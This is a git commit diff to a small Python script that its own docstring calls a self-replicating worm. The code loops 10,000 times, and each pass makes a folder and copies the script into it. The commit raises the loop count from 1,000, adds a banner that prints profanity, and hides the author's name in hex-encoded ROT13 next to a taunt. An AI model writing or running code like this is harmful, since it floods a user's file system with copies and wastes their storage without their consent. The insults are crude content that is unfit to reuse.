6b0a2794f37aa5cb83a36481a8cb3ed2eae39477
JohnMelodyMel <Johnmelodyme@gmail.com>
2019-03-01 12:53:41 +0800

    Update ENLFUVAV.py

--- Python/ENLFUVAV.py
+++ Python/ENLFUVAV.py
@@ -1,5 +1,5 @@
 # !/usr/bin/env python
-# Developed By John Melody Me
+# Developed By 77 62 75 61 20 7a 72 79 62 71 6c 20 7a 72 <= Find Out my name if you can , looser!
 '''
     This Script is a self-replicating worm.
     ' It creates multiples folders once runned.' 
@@ -8,12 +8,16 @@
 
 from sys import argv
 import subprocess
+import terminal_banner
+banner_text = "F    U   C   K       Y   O   U       A   S   S   H   O   L   E  "
+my_banner = terminal_banner.Banner(banner_text)
+print(my_banner)
 
 script = argv 
 name = str(script[0])
 print script
 print name
-for i in range(0,1000):
-    directoryName = 'Fuck You' +str(i)
+for i in range(0,10000):
+    directoryName = 'Fuck You Asshole' +str(i)
     subprocess.call(['mkdir', directoryName])
     subprocess.call(['cp',name,directoryName])
